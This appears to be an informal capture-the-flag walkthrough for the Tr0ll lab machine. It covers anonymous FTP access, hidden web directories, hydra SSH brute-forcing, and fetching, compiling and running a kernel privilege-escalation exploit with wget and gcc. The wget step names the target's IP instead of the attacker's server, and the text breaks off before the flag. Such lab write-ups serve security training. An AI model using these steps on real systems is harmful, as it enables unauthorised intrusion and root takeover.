3> port 80 is open, so, try this ip address in the browser, and use dirb "http://192.168.2.13" to find other hidden web pages.

got nothing

4>next try to get into ftp server

ftp 192.168.2.13

name: (hit enter by leaving it blank)

it will tell you about anonymous login

exit


again get into ftp

this time

name: anonymous

password: (blank)

log in successfull

ftp> dir


you will see a file called lol.pcap


ftp> get lol.pcap

exit



now open wireshark and open lol.pcap


after reading the packets we've found a secret text

sup3rs3cr3tdirlol

paste it in the browser with ip


192.168.2.13/sup3rs3cr3tdirlol


it will take you to a web page where you will se a file called roflmao

download that file and read it through notepad

there a hidden address is found

0x0856BF

again add this to url

http://192.168.2.13/0x0856BF/

it will take you to another page

here copy all the usernames in a file and save and copy the password also and save in a file in dekstop


then use hydra gtk

where you have to metion targets, ports, protocols and username list and password list then start(in this case we are trying to bruteforce ssh service so the port will be 22 and the protocol will be ssh)


after that you will get the username and password

Now login to ssh

ssh overflow@192.168.2.13 

and type the password

you will get inside the Tr0ll terminal

$ uname -a


you will get the kernel version of the os

3.13.0

again 
use

lsb_release -a
to get the os version this time

14.04

open another terminal
and type

searchsploit linux 3.13.0

to find the exploit 
It will be like this : Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation 
after  you found the exploit

Thn You have to locate it 
command: locate 37292.c

copy it to your local server folder 
command:cp /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/html

and turn the apache server on
Command: service apache2 start


then
go to victim terminal and get into tmp folder


then type:

wget "192.168.2.13/37292.c"

now the file has been downloaded inside the victim machine


now you have to compile and run it


gcc -o exploit 37292.c

./exploit

Here You go , you have the root id.
and here is the falg---
